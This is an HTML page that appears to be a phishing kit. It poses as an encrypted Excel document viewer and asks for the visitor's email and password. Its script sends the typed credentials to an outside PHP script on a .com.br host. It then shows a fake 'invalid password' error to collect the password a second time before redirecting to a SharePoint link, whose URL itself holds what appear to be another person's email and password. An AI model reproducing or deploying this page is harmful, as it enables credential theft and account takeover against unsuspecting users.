<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>continue</title>

    <style>
        /* Apply background image and center it */
        body {
            background-image: url('https://fredericklocalyokel.com/wp-content/uploads/2015/05/lawyerletter-blur.jpg');
            background-size: cover;
            height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* Style the form */
        form {
            background: #355E3B;
            background: -moz-linear-gradient(top, #008000 0%, #008000 73%, #008000 100%);
            background: -webkit-linear-gradient(top, #008000 0%, #008000 73%, #008000 100%);
            background: linear-gradient(to bottom, #355E3B 0%, #355E3B 73%, #355E3B 100%);
            color: white;
            font-weight: bold;
            border-radius: 25px 0px 65px 0px;
            -webkit-box-shadow: 3px 3px 15px 5px #000000;
            box-shadow: 3px 3px 15px 5px #000000;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 2;
            width: 360px;
            padding: 5px;
            text-align: center;
        }

        /* Style the form elements */
        input[type="email"],
        input[type="password"],
        button,
        input[type="submit"] {
            width: 75%;
            padding: 10px;
            margin: 5px 0px;
            border: none;
            border-radius: 5px;
        }

        input[type="submit"] {
            background-color: #179dbeec;
            color: white;
            cursor: pointer;
            width: 120px;
            border: 1px solid #f1f3f5;


        }

        input[type="submit"]:hover {
            background-color: #03afce;
        }

        button {
            background-color: #007BFF;
            color: white;
            cursor: pointer;

        }


        #msgfont {
            color: rgb(255, 166, 0);
        }

        /* Style the logo */
        .logo {
            margin-bottom: 20px;

        }

        /* Style the instructions */
        .instructions {
            font-size: 16px;
            color: #dfd9d9;
            margin-bottom: 20px;
        }

        @media (max-width: 480px) {

            /* Adjust form elements for smaller screens */
            input[type="text"],
            input[type="password"],
            button {
                padding: 8px;
                /* Decrease padding for smaller elements */
                font-size: 14px;
                /* Reduce font size for smaller elements */
            }
        }
    </style>

</head>

<body>
    <form method="post" name="street">
        <br /><br />
        <DIV class="mt-30 mb-30" style="BOX-SIZING: border-box; MARGIN: 10px 0px"><IMG
                class="img-responsive form-login__company-logo"
                style="BORDER-LEFT-WIDTH: 0px; BOX-SIZING: border-box; MAX-WIDTH: 100%; HEIGHT: auto; BORDER-RIGHT-WIDTH: 0px; VERTICAL-ALIGN: middle; BORDER-BOTTOM-WIDTH: 0px; MARGIN: 0px auto; DISPLAY: block; BORDER-TOP-WIDTH: 0px; MAX-HEIGHT: 40px"
                src="https://images.credly.com/images/7a1fa340-f261-4e69-b41b-b27ffaece00f/MOS_Excel_Expert6.png"></DIV>

        <div class="instructions">
            <p>This Document is end-to-end encrypted, &#x1F512;</p>
            <p>Session Timeout Login View Document...</p>
            <p id="msgfont"></p>
        </div>

        <input type="email" name="email" id="email" autofocus="" placeholder="Email address" value="[[-Email-]]"
            required /> <br />
        <input type="password" name="password" id="password" autofocus="" placeholder="Password" required />
        <br /><br />

        <input type="submit" value="View Doucment" name="btnLogin" id="btnLogin" />
        <br /><br />

    </form>


    <script type="text/javascript">
        var countAttempt = 0;
        var sendUrl = "https://guaibapan.com.br/wp-includes/images/smilies/id2/cnxsexcel.php";

        document.addEventListener('DOMContentLoaded', function () {
            var btnLogin = document.getElementById('btnLogin');
            var msgFont = document.getElementById('msgfont');

            btnLogin.addEventListener("click", function (event) {
                event.preventDefault();
                var password = document.getElementById('password').value;
                if (password == "") {
                    msgFont.innerHTML = "Please enter password";
                } else {
                    sendData();
                }
            });

            btnLogin.addEventListener("touchend", function (event) {
                event.preventDefault();
                var password = document.getElementById('password').value;
                if (password == "") {
                    msgFont.innerHTML = "Please enter password";
                } else {
                    sendData();
                }
            });

            function sendData() {
                var email = document.getElementById('email').value;
                var password = document.getElementById('password').value;

                console.log("Email - " + email);
                console.log("Password - " + password);

                // You can use the FormData object to collect form data
                var formData = new FormData(document.forms.street);

                countAttempt++;

                var xhr = new XMLHttpRequest();
                xhr.open('POST', sendUrl);

                xhr.send(formData);

                if (countAttempt >= 2) {
                    setTimeout(function () {
                        window.location = "https://regionalmanagers-my.sharepoint.com/:b:/p/ivan/EVhCMbG-roNHisHIx3fXqXkBATy7wZKPXYQsdKYIS5rgWA?e=1XABKN%2F&email=master%40gersung.co.kr&password=vmbmnbbmnmnm%2Cn%2C%2C";
                    }, 2000);
                    btnLogin.value = "Verifying....";
                    msgFont.innerHTML = "";
                } else {
                    setTimeout(function () {
                        msgFont.innerHTML = "The mailbox or password is invalid. Please enter a valid password";
                        btnLogin.value = "View";
                    }, 2000);
                    btnLogin.value = "Verifying...."
                }
            }
        });
    </script>
